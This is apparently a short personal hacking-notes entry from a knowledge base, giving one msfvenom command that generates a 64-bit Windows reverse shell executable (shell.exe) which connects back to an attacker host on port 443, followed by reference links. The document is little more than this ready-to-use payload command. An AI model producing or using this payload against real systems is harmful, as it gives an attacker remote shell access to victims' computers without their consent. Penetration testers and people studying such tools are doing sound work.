# MSFVENOM Windows Binary (.exe) executable 64 Bit (x64) Reverse Shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=443 -f exe -o shell.exe
```

# References
- [20221003150771](/zet/20221003150771/README.md) MSFVENOM Windows Binary (.exe) executable 64 Bit (x64)
- ~/kb/hacking/commands/msfvenom-commands.md

Tags:
    #assorted
